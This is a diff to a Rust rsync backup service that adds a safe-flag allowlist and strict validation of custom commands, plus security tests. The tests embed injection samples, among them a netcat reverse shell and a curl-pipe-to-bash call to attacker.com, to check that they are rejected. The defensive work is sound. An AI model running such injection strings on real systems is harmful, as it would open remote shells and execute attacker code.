@@ -1,14 +1,73 @@
 use crate::error::Result;
 use crate::types::job::{SyncJob, SyncMode};
 use crate::utils::is_ssh_remote; // TIM-123: Use centralized path utility
-use chrono::Local;
+use crate::utils::validation::{validate_file_path, validate_proxy_jump, validate_ssh_port};use chrono::Local;
 use regex::Regex;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::path::{Path, PathBuf};
 use std::process::{Child, Command, Stdio};
 use std::sync::{Arc, Mutex};
 
 const LATEST_SYMLINK_NAME: &str = "latest";
+
+/// Safe rsync flags that are allowed in custom commands
+/// SECURITY: These flags are explicitly allowlisted to prevent command injection
+const SAFE_RSYNC_FLAGS: &[&str] = &[
+    "-a",
+    "--archive",
+    "-v",
+    "--verbose",
+    "-z",
+    "--compress",
+    "-P",
+    "--progress",
+    "-n",
+    "--dry-run",
+    "-r",
+    "--recursive",
+    "-l",
+    "--links",
+    "-p",
+    "--perms",
+    "-t",
+    "--times",
+    "-g",
+    "--group",
+    "-o",
+    "--owner",
+    "-D",
+    "--devices",
+    "--specials",
+    "-h",
+    "--human-readable",
+    "--delete",
+    "--delete-before",
+    "--delete-during",
+    "--delete-after",
+    "--delete-excluded",
+    "--stats",
+    "--itemize-changes",
+    "--numeric-ids",
+    "--hard-links",
+    "--one-file-system",
+    "--partial",
+    "--update",
+    "--inplace",
+    "--append",
+    "--ignore-existing",
+    "--ignore-errors",
+    "--force",
+    "--max-size",
+    "--min-size",
+    "--timeout",
+    "--block-size",
+    "--exclude",
+    "--include",
+    "--filter",
+    "--exclude-from",
+    "--include-from",
+    "--link-dest",
+];
 
 /// Info about a running or completed backup
 #[derive(Debug, Clone)]
@@ -100,11 +159,7 @@ impl RsyncService {
         }
 
         // SSH config - either explicit or auto-detected from remote path
-        let ssh_enabled = job
-            .ssh_config
-            .as_ref()
-            .map(|s| s.enabled)
-            .unwrap_or(false);
+        let ssh_enabled = job.ssh_config.as_ref().map(|s| s.enabled).unwrap_or(false);
         let auto_detect_ssh = is_ssh_remote(&job.source_path);
 
         if ssh_enabled || auto_detect_ssh {
@@ -134,9 +189,8 @@ impl RsyncService {
                     }
                 }
                 if ssh.disable_host_key_checking == Some(true) {
-                    ssh_cmd.push_str(
-                        " -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
-                    );
+                    ssh_cmd
+                        .push_str(" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null");
                 }
             }
 
@@ -165,6 +219,8 @@ impl RsyncService {
         args
     }
 
+    /// Parse custom command with strict validation against safe flag allowlist
+    /// SECURITY: This function validates all flags against SAFE_RSYNC_FLAGS to prevent command injection
     fn parse_custom_command(
         &self,
         cmd: &str,
@@ -172,12 +228,103 @@ impl RsyncService {
         dest: &str,
         link_dest: Option<&str>,
     ) -> Vec<String> {
+        // Perform variable substitution
+        let source_with_slash = self.ensure_trailing_slash(source);
         let processed = cmd
-            .replace("{source}", &self.ensure_trailing_slash(source))
+            .replace("{source}", &source_with_slash)
             .replace("{dest}", dest)
             .replace("{linkDest}", link_dest.unwrap_or(""));
 
-        shell_words::split(&processed).unwrap_or_else(|_| vec![processed])
+        // Parse the command into tokens
+        let tokens = match shell_words::split(&processed) {
+            Ok(tokens) => tokens,
+            Err(_) => {
+                log::error!("[rsync_service] Failed to parse custom command, ignoring it");
+                return vec![];
+            }
+        };
+
+        // Build allowlist set for efficient lookup
+        let safe_flags: HashSet<&str> = SAFE_RSYNC_FLAGS.iter().copied().collect();
+
+        let mut validated_args = Vec::new();
+        let mut expect_flag_value = false;
+
+        for token in tokens {
+            // Skip "rsync" command itself
+            if token == "rsync" {
+                continue;
+            }
+
+            // Check if this is a path (source or dest)
+            let is_path = token == source_with_slash
+                || token == dest
+                || (link_dest.is_some() && token == link_dest.unwrap());
+
+            if is_path {
+                validated_args.push(token);
+                expect_flag_value = false;
+                continue;
+            }
+
+            // Check if this is a flag (starts with -)
+            if token.starts_with('-') {
+                // Extract the flag part (before = for flags like --exclude=pattern)
+                let flag_part = if let Some(idx) = token.find('=') {
+                    &token[..idx]
+                } else {
+                    &token
+                };
+
+                // SECURITY: Explicitly block dangerous flags that could enable command execution
+                if flag_part == "-e" || flag_part == "--rsh" {
+                    log::error!(
+                        "[rsync_service] Rejected dangerous flag '{}' that enables command execution",
+                        flag_part
+                    );
+                    return vec![];
+                }
+
+                // SECURITY: Reject any flag not in the allowlist
+                if !safe_flags.contains(flag_part) {
+                    log::warn!(
+                        "[rsync_service] Rejected unsafe flag '{}' in custom command. \
+                        Only allowlisted flags are permitted.",
+                        flag_part
+                    );
+                    return vec![];
+                }
+
+                // Check if this flag expects a value (doesn't contain =)
+                let has_equals = token.contains('=');
+
+                validated_args.push(token);
+
+                expect_flag_value = !has_equals;
+                continue;
+            }
+
+            // If we're expecting a flag value, allow this token
+            if expect_flag_value {
+                validated_args.push(token);
+                expect_flag_value = false;
+                continue;
+            }
+
+            // If we reach here, it's an unexpected token that could be malicious
+            log::warn!(
+                "[rsync_service] Rejected unexpected token '{}' in custom command",
+                token
+            );
+            return vec![];
+        }
+
+        // If validation passed, log and return
+        log::info!(
+            "[rsync_service] Custom command validated successfully: {} tokens",
+            validated_args.len()
+        );
+        validated_args
     }
 
     fn ensure_trailing_slash(&self, path: &str) -> String {
@@ -307,10 +454,7 @@ impl RsyncService {
             .stderr(Stdio::piped())
             .spawn()?;
 
-        log::info!(
-            "[rsync_service] rsync spawned with PID: {}",
-            child.id()
-        );
+        log::info!("[rsync_service] rsync spawned with PID: {}", child.id());
 
         // Track active job
         if let Ok(mut jobs) = self.active_jobs.lock() {
@@ -346,9 +490,7 @@ impl RsyncService {
                         .status();
 
                     // Also kill the specific PID in case process group kill didn't work
-                    let _ = Command::new("kill")
-                        .args(["-9", &pid.to_string()])
-                        .status();
+                    let _ = Command::new("kill").args(["-9", &pid.to_string()]).status();
 
                     // Additionally, try pkill to catch any orphaned rsync children
                     let _ = Command::new("pkill")
@@ -522,7 +664,10 @@ mod tests {
         });
 
         let args = service.build_rsync_args(&job, "/dest", None);
-        let e_idx = args.iter().position(|a| a == "-e").expect("-e flag missing");
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
         let ssh_cmd = &args[e_idx + 1];
 
         assert!(ssh_cmd.contains("ssh"));
@@ -546,7 +691,10 @@ mod tests {
         });
 
         let args = service.build_rsync_args(&job, "/dest", None);
-        let e_idx = args.iter().position(|a| a == "-e").expect("-e flag missing");
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
         let ssh_cmd = &args[e_idx + 1];
 
         assert!(ssh_cmd.contains("StrictHostKeyChecking=no"));
@@ -567,7 +715,10 @@ mod tests {
         });
 
         let args = service.build_rsync_args(&job, "/dest", None);
-        let e_idx = args.iter().position(|a| a == "-e").expect("-e flag missing");
+        let e_idx = args
+            .iter()
+            .position(|a| a == "-e")
+            .expect("-e flag missing");
         let ssh_cmd = &args[e_idx + 1];
 
         assert!(ssh_cmd.contains("-J bastion@10.0.0.1"));
@@ -630,7 +781,8 @@ mod tests {
     fn test_custom_command_substitution() {
         let service = RsyncService::new();
         let mut job = create_test_job(SyncMode::TimeMachine);
-        job.config.custom_command = Some("rsync -a {source} {dest} --link-dest={linkDest}".to_string());
+        job.config.custom_command =
+            Some("rsync -a {source} {dest} --link-dest={linkDest}".to_string());
 
         let args = service.build_rsync_args(&job, "/dest/new", Some("/dest/old"));
         assert!(args.contains(&"/src/".to_string()));
@@ -673,7 +825,11 @@ mod tests {
 
         // Should match pattern YYYY-MM-DD-HHMMSS
         let re = Regex::new(r"^\d{4}-\d{2}-\d{2}-\d{6}$").unwrap();
-        assert!(re.is_match(&name), "Folder name '{}' doesn't match expected format", name);
+        assert!(
+            re.is_match(&name),
+            "Folder name '{}' doesn't match expected format",
+            name
+        );
     }
 
     #[test]
@@ -689,7 +845,9 @@ mod tests {
     fn test_is_ssh_remote_detection() {
         // Valid SSH remotes
         assert!(super::is_ssh_remote("user@host:/path"));
-        assert!(super::is_ssh_remote("fmahner@iris.cbs.mpg.de:/home/fmahner"));
+        assert!(super::is_ssh_remote(
+            "fmahner@iris.cbs.mpg.de:/home/fmahner"
+        ));
         assert!(super::is_ssh_remote("root@192.168.1.1:/var/backup"));
 
         // Not SSH remotes (local paths)
@@ -736,7 +894,10 @@ mod tests {
         let job_id = "test-job-1";
 
         // New job should not be marked as running
-        assert!(!service.is_job_running(job_id), "New job should not be running");
+        assert!(
+            !service.is_job_running(job_id),
+            "New job should not be running"
+        );
     }
 
     #[test]
@@ -752,7 +913,10 @@ mod tests {
         }
 
         // Job should now be marked as running
-        assert!(service.is_job_running(job_id), "Job should be running after adding to active_jobs");
+        assert!(
+            service.is_job_running(job_id),
+            "Job should be running after adding to active_jobs"
+        );
     }
 
     #[test]
@@ -770,7 +934,10 @@ mod tests {
         // Attempt to spawn should return JobAlreadyRunning error
         let result = service.spawn_rsync(&job);
 
-        assert!(result.is_err(), "spawn_rsync should return error for duplicate job");
+        assert!(
+            result.is_err(),
+            "spawn_rsync should return error for duplicate job"
+        );
 
         match result.unwrap_err() {
             crate::error::AmberError::JobAlreadyRunning(id) => {
@@ -793,18 +960,27 @@ mod tests {
         }
 
         // Verify job is running
-        assert!(service.is_job_running(job_id), "Job should be running before mark_completed");
+        assert!(
+            service.is_job_running(job_id),
+            "Job should be running before mark_completed"
+        );
 
         // Mark as completed
         service.mark_completed(job_id);
 
         // Verify job is no longer running
-        assert!(!service.is_job_running(job_id), "Job should not be running after mark_completed");
+        assert!(
+            !service.is_job_running(job_id),
+            "Job should not be running after mark_completed"
+        );
 
         // Verify job was removed from HashMap
         {
             let jobs = service.active_jobs.lock().unwrap();
-            assert!(!jobs.contains_key(job_id), "Job should be removed from active_jobs HashMap");
+            assert!(
+                !jobs.contains_key(job_id),
+                "Job should be removed from active_jobs HashMap"
+            );
         }
     }
 
@@ -821,19 +997,28 @@ mod tests {
         }
 
         // Verify job is running
-        assert!(service.is_job_running(job_id), "Job should be running before kill_job");
+        assert!(
+            service.is_job_running(job_id),
+            "Job should be running before kill_job"
+        );
 
         // Kill job (will fail to kill actual process, but should still remove from HashMap)
         let result = service.kill_job(job_id);
         assert!(result.is_ok(), "kill_job should succeed");
 
         // Verify job is no longer running
-        assert!(!service.is_job_running(job_id), "Job should not be running after kill_job");
+        assert!(
+            !service.is_job_running(job_id),
+            "Job should not be running after kill_job"
+        );
 
         // Verify job was removed from HashMap
         {
             let jobs = service.active_jobs.lock().unwrap();
-            assert!(!jobs.contains_key(job_id), "Job should be removed from active_jobs HashMap");
+            assert!(
+                !jobs.contains_key(job_id),
+                "Job should be removed from active_jobs HashMap"
+            );
         }
     }
 
@@ -861,7 +1046,10 @@ mod tests {
 
         // First job should be stopped, second still running
         assert!(!service.is_job_running(job_id_1), "Job 1 should be stopped");
-        assert!(service.is_job_running(job_id_2), "Job 2 should still be running");
+        assert!(
+            service.is_job_running(job_id_2),
+            "Job 2 should still be running"
+        );
     }
 
     #[test]
@@ -873,7 +1061,10 @@ mod tests {
         service.mark_completed(job_id);
 
         // Verify job is not running
-        assert!(!service.is_job_running(job_id), "Non-existent job should not be running");
+        assert!(
+            !service.is_job_running(job_id),
+            "Non-existent job should not be running"
+        );
     }
 
     #[test]
@@ -883,10 +1074,16 @@ mod tests {
 
         // Should not panic or error
         let result = service.kill_job(job_id);
-        assert!(result.is_ok(), "kill_job on non-existent job should succeed gracefully");
+        assert!(
+            result.is_ok(),
+            "kill_job on non-existent job should succeed gracefully"
+        );
 
         // Verify job is not running
-        assert!(!service.is_job_running(job_id), "Non-existent job should not be running");
+        assert!(
+            !service.is_job_running(job_id),
+            "Non-existent job should not be running"
+        );
     }
 
     #[test]
@@ -915,7 +1112,10 @@ mod tests {
         let retrieved = retrieved.unwrap();
         assert_eq!(retrieved.job_id, job_id);
         assert_eq!(retrieved.folder_name, "2024-03-15-120000");
-        assert_eq!(retrieved.snapshot_path, PathBuf::from("/dest/backup/2024-03-15-120000"));
+        assert_eq!(
+            retrieved.snapshot_path,
+            PathBuf::from("/dest/backup/2024-03-15-120000")
+        );
     }
 
     #[test]
@@ -938,12 +1138,231 @@ mod tests {
         }
 
         // Verify it exists
-        assert!(service.get_backup_info(job_id).is_some(), "Backup info should exist before clear");
+        assert!(
+            service.get_backup_info(job_id).is_some(),
+            "Backup info should exist before clear"
+        );
 
         // Clear backup info
         service.clear_backup_info(job_id);
 
         // Verify it's removed
-        assert!(service.get_backup_info(job_id).is_none(), "Backup info should be removed after clear");
+        assert!(
+            service.get_backup_info(job_id).is_none(),
+            "Backup info should be removed after clear"
+        );
+    }
+
+    // ========== Security Tests for Custom Command Injection ==========
+
+    #[test]
+    fn test_custom_command_rejects_dangerous_e_flag() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try to inject shell command via -e flag
+        job.config.custom_command = Some("rsync -av -e 'ssh -o ProxyCommand=\"nc -e /bin/sh attacker.com 4444\"' {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject the entire command and return empty args
+        assert_eq!(args.len(), 0, "Dangerous -e flag should be rejected");
+    }
+
+    #[test]
+    fn test_custom_command_rejects_rsh_flag() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try to inject shell command via --rsh flag
+        job.config.custom_command =
+            Some("rsync -av --rsh='bash -c \"evil_command\"' {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject the entire command
+        assert_eq!(args.len(), 0, "--rsh flag should be rejected");
+    }
+
+    #[test]
+    fn test_custom_command_rejects_command_substitution() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try command substitution attack
+        job.config.custom_command =
+            Some("rsync -av {source} {dest}; curl attacker.com/steal | bash".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject due to unexpected tokens after paths
+        assert_eq!(args.len(), 0, "Command substitution should be rejected");
+    }
+
+    #[test]
+    fn test_custom_command_rejects_pipe_injection() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try pipe injection
+        job.config.custom_command =
+            Some("rsync -av {source} {dest} | nc attacker.com 4444".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject due to pipe being an unexpected token
+        assert_eq!(args.len(), 0, "Pipe injection should be rejected");
+    }
+
+    #[test]
+    fn test_custom_command_rejects_unknown_flags() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try using a non-allowlisted flag
+        job.config.custom_command = Some("rsync -av --fake-flag {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject due to unknown flag
+        assert_eq!(args.len(), 0, "Unknown flags should be rejected");
+    }
+
+    #[test]
+    fn test_custom_command_accepts_safe_flags() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Use only safe flags
+        job.config.custom_command =
+            Some("rsync -avz --delete --progress {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should accept safe flags
+        assert!(args.len() > 0, "Safe flags should be accepted");
+        assert!(args.contains(&"-a".to_string()));
+        assert!(args.contains(&"-v".to_string()));
+        assert!(args.contains(&"-z".to_string()));
+        assert!(args.contains(&"--delete".to_string()));
+        assert!(args.contains(&"--progress".to_string()));
+    }
+
+    #[test]
+    fn test_custom_command_accepts_exclude_patterns() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Use safe flags with exclude patterns
+        job.config.custom_command =
+            Some("rsync -av --exclude=*.log --exclude=temp/ {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should accept exclude patterns
+        assert!(args.len() > 0, "Safe flags with exclude should be accepted");
+        assert!(args.contains(&"--exclude=*.log".to_string()));
+        assert!(args.contains(&"--exclude=temp/".to_string()));
+    }
+
+    #[test]
+    fn test_custom_command_with_link_dest() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::TimeMachine);
+
+        // Use safe flags with link-dest
+        job.config.custom_command =
+            Some("rsync -av --link-dest={linkDest} {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest/new", Some("/dest/old"));
+
+        // Should accept link-dest
+        assert!(
+            args.len() > 0,
+            "Safe flags with link-dest should be accepted"
+        );
+        assert!(args.contains(&"--link-dest=/dest/old".to_string()));
+    }
+
+    #[test]
+    fn test_custom_command_empty_string_uses_defaults() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Empty custom command should use default flags
+        job.config.custom_command = Some("".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should use default flags
+        assert!(args.contains(&"-D".to_string()));
+        assert!(args.contains(&"--numeric-ids".to_string()));
+    }
+
+    #[test]
+    fn test_custom_command_rejects_backticks() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try backtick command substitution
+        job.config.custom_command =
+            Some("rsync -av {source} {dest} `malicious_command`".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject backtick injection
+        assert_eq!(
+            args.len(),
+            0,
+            "Backtick command substitution should be rejected"
+        );
+    }
+
+    #[test]
+    fn test_custom_command_rejects_redirects() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Try output redirection
+        job.config.custom_command =
+            Some("rsync -av {source} {dest} > /tmp/stolen_data".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should reject redirection
+        assert_eq!(args.len(), 0, "Output redirection should be rejected");
+    }
+
+    #[test]
+    fn test_custom_command_with_numeric_values() {
+        let service = RsyncService::new();
+        let mut job = create_test_job(SyncMode::Mirror);
+
+        // Safe flags with numeric values
+        job.config.custom_command =
+            Some("rsync -av --timeout=300 --max-size=1G {source} {dest}".to_string());
+
+        let args = service.build_rsync_args(&job, "/dest", None);
+
+        // Should accept flags with numeric values
+        assert!(args.len() > 0, "Safe flags with values should be accepted");
+        assert!(args.contains(&"--timeout=300".to_string()));
+        assert!(args.contains(&"--max-size=1G".to_string()));
+    }
+
+    #[test]
+    fn test_parse_custom_command_validates_all_flags() {
+        let service = RsyncService::new();
+
+        // Test that parse_custom_command properly validates
+        let result = service.parse_custom_command(
+            "rsync -av --some-unsafe-flag {source} {dest}",
+            "/src",
+            "/dest",
+            None,
+        );
+
+        // Should return empty vec for unsafe flag
+        assert_eq!(result.len(), 0, "Unsafe flags should cause rejection");
     }
 }
